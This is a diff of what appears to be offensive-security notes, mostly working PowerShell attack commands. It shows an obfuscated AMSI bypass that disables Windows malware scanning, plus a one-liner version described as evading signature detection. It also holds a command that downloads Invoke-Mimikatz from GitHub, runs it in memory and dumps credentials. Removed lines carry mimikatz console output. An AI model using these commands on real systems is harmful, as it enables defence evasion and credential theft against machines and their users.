@@ -41,7 +41,7 @@ IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercont
 
 
 
-
+--------------------------------------------------------------------------------------------------------------------------------------------------------
 
 $m=[ref].assembly.DefinedTypes|?{$_.name -like "*Iu*i*s"}|%{$_.getfields('no'+'NP'+'ubl'+'ic,st'+'At'+'i'+'c')}|?{$_.name -like "*fa*l*d"};
  
@@ -49,23 +49,13 @@ $m=[ref].assembly.DefinedTypes|?{$_.name -like "*Iu*i*s"}|%{$_.getfields('no'+'N
 then
  
 $m.setvalue(0,$true)
- 
+ --------------------------------------------------------------------------------------------------------------------------------------------------------
  
 If you have no option but to run it as a one-liner, you can try this - it's unique to us, so should still evade signature detection once the original gets burnt:
  
 $m=[ref].assembly.DefinedTypes|?{$_.name -like "*Iu*i*s"}|%{$_.getfields('no'+'NP'+'ubl'+'ic,st'+'At'+'i'+'c')}|?{$_.name -like "*fa*l*d"}|%{$_.setvalue(0,$true)}
 
-
+--------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
 IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;
-Hostname: DESKTOP-RDTHAAP / S-1-5-21-4058277614-2934734594-347970069
- 
-  .#####.   mimikatz 2.2.0 (x64) #19041 Jan 29 2023 07:49:10
-.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
-## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
-## \ / ##       > https://blog.gentilkiwi.com/mimikatz
-'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
-  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
- 
-mimikatz(powershell) # privilege::debug
